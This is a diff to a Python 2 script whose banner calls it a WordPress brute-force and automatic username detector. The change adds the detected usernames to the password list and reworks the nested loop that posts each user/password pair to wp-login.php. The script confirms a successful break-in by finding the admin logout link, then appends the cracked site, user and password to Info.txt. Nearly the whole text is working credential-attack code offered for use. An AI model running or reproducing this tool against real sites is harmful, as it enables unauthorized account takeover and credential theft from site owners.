@@ -32,6 +32,7 @@ class Zedan:
 					user = re.search("(.*?) |" , title[0]).group(1)
 					print str(i)+"-"+"[+] User Detected : "+user
 					users.append(user)
+					passlists.append(user)
 				else:
 					print str(i)+"-"+"[-] Searching.."
 			except:
@@ -51,38 +52,40 @@ class Zedan:
 					exit(-1)
 				else:
 					passlist = open(xads,"r")
-					for password in passlist:
-						password = password.rstrip()
-						for user in users:
-							print "[+] Trying With : " + user +"|"+ password
-							Cookies = cookielib.CookieJar()
-							openitplz = urllib2.build_opener(urllib2.HTTPCookieProcessor(Cookies))
-							dataforlogin = urllib.urlencode({'log' : user, 'pwd' : password})
-							try:
-								f4ck = site+"/wp-login.php"
-								f4ckwp = site+"/wp-admin"
-								f = Fuhrer.get(f4ck)
-								if f.status_code == 200:
-									try:
-										openitplz.open(str(f4ck), dataforlogin)
-										readitplz = openitplz.open(str(f4ckwp))
-										lastone = readitplz.read()
-										if '<li id="wp-admin-bar-logout">' in lastone:
-											print "[+] => Cracked | Done !"
-											with open("Info.txt","a") as nowwriteplz:
-												nowwriteplz.writelines(f4ck+"#"+user+"@"+password+"\n")
-											break
-										else:
-											print "[-] => Wrong .:LoginData !"
-									except Exception, Mrx:
-										print "[!]" + str(Mrx)
+					for passwordd in passlist:
+						passwordd = passwordd.rstrip()
+						passlists.append(passwordd)
+						for password in passlists:
+							for user in users:
+								print "[+] Trying With : " + user +"|"+ password
+								Cookies = cookielib.CookieJar()
+								openitplz = urllib2.build_opener(urllib2.HTTPCookieProcessor(Cookies))
+								dataforlogin = urllib.urlencode({'log' : user, 'pwd' : password})
+								try:
+									f4ck = site+"/wp-login.php"
+									f4ckwp = site+"/wp-admin"
+									f = Fuhrer.get(f4ck)
+									if f.status_code == 200:
+										try:
+											openitplz.open(str(f4ck), dataforlogin)
+											readitplz = openitplz.open(str(f4ckwp))
+											lastone = readitplz.read()
+											if '<li id="wp-admin-bar-logout">' in lastone:
+												print "[+] => Account is Cracked | Done !"
+												with open("Info.txt","a") as nowwriteplz:
+													nowwriteplz.writelines(f4ck+"#"+user+"@"+password+"\n")
+												break
+											else:
+												print "[-] => Wrong .:LoginData !"
+										except Exception, Mrx:
+											print "[!]" + str(Mrx)
+											sys.exit()
+									else:
+										print "[!] site:wp-login.php :\n"+str(f)
 										sys.exit()
-								else:
-									print "[!] site:wp-login.php :\n"+str(f)
+								except Exception,Mrx:
+									print "[!] WP-Login Error :  404\n"+str(Mrx)
 									sys.exit()
-							except Exception,Mrx:
-								print "[!] WP-Login Error :  404\n"+str(Mrx)
-								sys.exit()
 		except Exception, Mrx:
 			print "[!]Usage : script.py http://localhost passlist.txt 5\n" + str(Mrx)
 			sys.exit()
@@ -92,6 +95,7 @@ if __name__ == "__main__":
 	os.system('cls' if os.name == 'nt' else 'clear')
 	print """\n[+] Wordpress Sites BruteForce & Auto Username Detector By : ZeDaN-Mrx\n[+] Instagram : @xFuhr3r\n"""
 	users = []
+	passlists = []
 	Fuhrer = requests.session()
 	site = sys.argv[1]
 	try:
